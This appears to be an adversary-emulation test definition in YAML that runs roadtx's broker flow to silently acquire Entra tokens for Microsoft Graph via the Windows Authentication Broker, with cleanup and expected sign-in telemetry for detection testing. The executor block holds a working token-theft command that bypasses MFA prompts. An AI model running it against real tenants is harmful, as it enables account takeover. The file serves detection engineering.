attack_technique: T1078.004
display_name: "Defense Evasion – Authentication Broker Abuse (WAM/Web Account Manager)"
atomic_tests:
  - name: "Auth broker token acquisition via roadtx broker flow"
    auto_generated_guid: f2a3b4c5-d6e7-8901-fabc-901234567811
    description: |
      Abuses the Windows Authentication Broker (WAM) or platform SSO
      mechanism to silently acquire tokens for Entra-connected resources
      without interactive prompts. The broker trusts the existing device
      session; an attacker with local code execution can call the broker
      directly. Wraps roadtx broker command.
    supported_platforms:
      - windows
    input_arguments:
      tenant_id:
        description: "Entra tenant ID of the lab tenant."
        type: String
        default: "00000000-0000-0000-0000-000000000000"
      client_id:
        description: "Client ID of the application to impersonate via broker."
        type: String
        default: "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
      resource:
        description: "Target resource URI."
        type: String
        default: "https://graph.microsoft.com"
      token_output_path:
        description: "Path to write the resulting token cache file."
        type: Path
        default: "#{token_cache_path}"
    executor:
      name: powershell
      command: |
        roadtx browserbroker `
          --client '#{client_id}' `
          --resource '#{resource}' `
          --tenant '#{tenant_id}' `
          --tokenfile '#{token_output_path}'
    cleanup_command: |
      if (Test-Path -LiteralPath '#{token_output_path}') {
          Remove-Item -LiteralPath '#{token_output_path}' -Force
      }
    references:
      - "https://dirkjanm.io/using-the-windows-authentication-broker-to-silently-steal-tokens/"
    auth_profile: "auth-broker"
    defense_evasion: "Silent token acquisition via WAM broker; no MFA prompt; leverages existing device session"
    requires_token: false
    expected_telemetry:
      - source: entra_signin
        match:
          authenticationProtocol: "oAuth2"
          clientAppUsed: "Microsoft Authentication Library"
        within_minutes: 15
    exercises_chokepoint:
      id: "DC-EVAS-008"
      url: "https://detectionchokepoints.com/evasion/auth-broker-abuse"
